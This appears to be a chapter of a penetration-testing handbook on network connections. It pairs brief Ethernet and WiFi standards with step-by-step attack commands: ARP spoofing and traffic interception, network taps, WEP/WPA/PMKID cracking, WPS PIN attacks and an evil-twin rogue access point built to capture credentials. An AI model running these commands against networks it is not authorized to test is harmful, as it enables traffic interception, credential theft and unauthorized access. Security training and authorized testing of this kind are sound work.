# 12. NETWORK CONNECTIONS - COMPLETE GUIDE <a name="network-connections"></a>

## 12.1 ETHERNET (COPPER & FIBER)

### 12.1.1 Copper Ethernet

**Standards:**
- 10BASE-T (10 Mbps)
- 100BASE-TX (Fast Ethernet, 100 Mbps)
- 1000BASE-T (Gigabit, 1 Gbps)
- 10GBASE-T (10 Gigabit)

**Cable Types:**
- Cat5e: Up to 1 Gbps
- Cat6: Up to 10 Gbps (short distances)
- Cat6a: Up to 10 Gbps (100m)
- Cat7: Shielded, up to 10 Gbps+

**Attack Scenarios:**

**A. Physical Access:**
```bash
# Connect laptop to network drop:
# 1. Plug in Ethernet cable
# 2. Check link status:
ethtool eth0
# Look for: Link detected: yes

# 3. Request DHCP:
dhclient eth0

# 4. Check IP:
ip addr show eth0

# 5. Identify network:
ip route
# Shows default gateway

# 6. Scan gateway:
nmap -sV 192.168.1.1

# 7. Scan subnet:
nmap -sn 192.168.1.0/24
```

**B. Network Tap:**
```bash
# Passive tap (e.g., Throwing Star LAN Tap):
# - Inline device
# - Mirrors traffic to monitoring port
# - Completely passive, undetectable

# Setup:
# 1. Insert tap between target and switch
# 2. Connect monitoring port to laptop
# 3. Capture traffic:
tcpdump -i eth0 -w capture.pcap

# Active tap (Raspberry Pi):
# 1. Configure Pi as bridge:
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 eth1
ifconfig br0 up

# 2. Capture traffic:
tcpdump -i br0 -w capture.pcap

# 3. Forward normally (transparent)
```

**C. ARP Spoofing:**
```bash
# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

# Using ettercap:
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//
# Intercepts traffic between gateway (.1) and victim (.50)

# Using arpspoof:
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
# In another terminal:
arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# Capture traffic:
tcpdump -i eth0 -w mitm.pcap

# Using bettercap:
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> net.sniff on
```

### 12.1.2 Fiber Ethernet

**Standards:**
- 100BASE-FX (Fast Ethernet)
- 1000BASE-SX/LX (Gigabit)
- 10GBASE-SR/LR (10 Gigabit)

**Connectors:**
- SC, LC, ST, MTP/MPO

**Attacks:**
- Physical tapping more difficult (requires optical tap)
- Same Layer 2/3 attacks once connected
- Focus on media converters as access points

---

## 12.2 WiFi (802.11)

### 12.2.1 Standards

- **802.11a**: 5 GHz, up to 54 Mbps
- **802.11b**: 2.4 GHz, up to 11 Mbps
- **802.11g**: 2.4 GHz, up to 54 Mbps
- **802.11n**: 2.4/5 GHz, up to 600 Mbps
- **802.11ac**: 5 GHz, up to 6.9 Gbps
- **802.11ax (Wi-Fi 6)**: 2.4/5/6 GHz, up to 9.6 Gbps

### 12.2.2 Enumeration

**Discover WiFi Networks:**
```bash
# Using iwlist:
iwlist wlan0 scan

# Using nmcli:
nmcli dev wifi list

# Using airodump-ng:
airmon-ng start wlan0
airodump-ng wlan0mon

# Shows: BSSID, Power, Beacons, Data, Ch, MB, ENC, CIPHER, AUTH, ESSID

# Detailed scan with wash (WPS):
wash -i wlan0mon

# Using Kismet:
kismet -c wlan0

# Wireshark:
wireshark -i wlan0mon -k
# Filter: wlan.fc.type_subtype == 0x08  (Beacons)
```

### 12.2.3 Attacks on WiFi

**A. WEP Cracking:**
```bash
# Start monitor mode:
airmon-ng start wlan0

# Capture traffic:
airodump-ng -c <channel> --bssid <AP_MAC> -w wep wlan0mon

# Wait for IVs (50,000+ needed)
# Or speed up with packet injection:

# Fake authentication:
aireplay-ng -1 0 -a <AP_MAC> -h <YOUR_MAC> wlan0mon

# ARP replay:
aireplay-ng -3 -b <AP_MAC> -h <YOUR_MAC> wlan0mon

# After collecting enough IVs:
aircrack-ng wep-01.cap
```

**B. WPA/WPA2 Cracking:**
```bash
# Capture handshake:
airodump-ng -c <channel> --bssid <AP_MAC> -w wpa wlan0mon

# Deauth client to force reconnect:
aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon

# Wait for handshake:
# airodump-ng shows: WPA handshake: <AP_MAC>

# Crack with wordlist:
aircrack-ng wpa-01.cap -w /usr/share/wordlists/rockyou.txt

# Or hashcat:
# Convert to hashcat format:
aircrack-ng wpa-01.cap -J wpa
# Creates wpa.hccapx

# Crack with hashcat:
hashcat -m 2500 wpa.hccapx rockyou.txt

# Or use cap2hccapx:
cap2hccapx.bin wpa-01.cap wpa.hccapx

# Crack:
hashcat -m 22000 wpa.hccapx rockyou.txt  # WPA/WPA2
hashcat -m 22001 wpa.hccapx rockyou.txt  # WPA3
```

**C. WPS PIN Attack:**
```bash
# Check if WPS enabled:
wash -i wlan0mon

# Reaver attack:
reaver -i wlan0mon -b <AP_MAC> -vv

# Pixie dust attack (faster):
reaver -i wlan0mon -b <AP_MAC> -K -vv

# Bully:
bully <AP_MAC> -c <channel> wlan0mon
```

**D. Evil Twin / Rogue AP:**
```bash
# Using airbase-ng:
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Configure DHCP:
# In another terminal:
ifconfig at0 up
ifconfig at0 192.168.1.1 netmask 255.255.255.0

# Start DHCP server:
cat > /tmp/dhcpd.conf << EOF
authoritative;
default-lease-time 600;
max-lease-time 7200;
subnet 192.168.1.0 netmask 255.255.255.0 {
    option routers 192.168.1.1;
    option subnet-mask 255.255.255.0;
    option domain-name-servers 8.8.8.8;
    range 192.168.1.10 192.168.1.100;
}
EOF

dhcpd -cf /tmp/dhcpd.conf at0

# Enable IP forwarding:
echo 1 > /proc/sys/net/ipv4/ip_forward

# NAT:
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# Capture credentials:
ettercap -T -q -i at0

# Or use Wifiphisher (automated):
wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade
```

**E. PMKID Attack (Hashcat):**
```bash
# Capture PMKID:
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Or:
hcxdumptool -i wlan0mon --enable_status=3

# Convert to hashcat format:
hcxpcapngtool -o pmkid.hash pmkid.pcapng

# Crack:
hashcat -m 16800 pmkid.hash rockyou.txt
```

### 12.2.4 Connecting to WiFi

**From Linux:**
```bash
# WPA/WPA2:
wpa_passphrase "SSID" "password" > wpa.conf
wpa_supplicant -B -i wlan0 -c wpa.conf
dhclient wlan0

# Or using nmcli:
nmcli dev wifi connect "SSID" password "password"

# Open network:
iwconfig wlan0 essid "SSID"
dhclient wlan0

# WEP:
iwconfig wlan0 essid "SSID" key s:password
dhclient wlan0

# Hidden network:
nmcli dev wifi connect "SSID" password "password" hidden yes
```

**From Windows:**
```powershell
# GUI: Click network icon, select network, enter password

# Command line:
netsh wlan connect name="SSID"

# Add profile:
netsh wlan add profile filename="wifi.xml"
# wifi.xml contains network config

# Show profiles:
netsh wlan show profiles

# Show password:
netsh wlan show profile name="SSID" key=clear
```

---

## 12.3 ETHERNET VLANs

(Already covered extensively in Section 11 - VLAN TAGGING)

Quick recap for connecting:
```bash
# Linux:
ip link add link eth0 name eth0.100 type vlan id 100
ip link set eth0.100 up
dhclient eth0.100

# Windows:
# Use adapter advanced properties or Hyper-V
```

---